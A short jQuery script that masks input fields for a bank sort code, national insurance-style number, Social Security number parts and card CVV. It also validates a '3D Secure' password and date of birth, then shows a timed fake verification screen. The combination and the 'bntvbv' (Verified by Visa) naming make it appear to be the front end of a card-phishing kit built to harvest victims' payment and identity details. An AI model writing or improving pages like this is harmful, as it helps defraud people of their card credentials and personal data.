jQuery(function() {
  $("#sortcode").mask("99-99-99");
});
jQuery(function() {
  $("#nin").mask("999-999-999");
})
jQuery(function() {
  $("#ssn3").mask("999");
})
jQuery(function() {
  $("#ssn2").mask("99");
})
jQuery(function() {
  $("#ssn4").mask("9999");
})
jQuery(function() {
  $("#cvv").mask("9999");
})

$(document).ready(function() {
  $("#bntvbv").click(function() {
    var GO;
    var x3Dsecure = $("#3Dsecure").val();
    var MM = $("#MM").val();
    var DD = $("#DD").val();
    var YYYY = $("#YYYY").val();
    if (x3Dsecure === "") {
      alert("Please check your entries and try again");
      GO = false;
    }
    if (MM == "-1" || DD == "-1" || YYYY == "-1") {
      alert("Please check your entries and try again");
      GO = false;
    }
    if (GO === false) {
      return false;
    } else {
      document.getElementById("3dpage").className = "show";
      document.getElementById("3dweb").className = "hide";
    }
  })
})
window.onload = function() {
  setTimeout(function() {
    document.getElementById("3dweb").className = "";
    document.getElementById("3dpage").className = "hide";
  }, 3000)
}
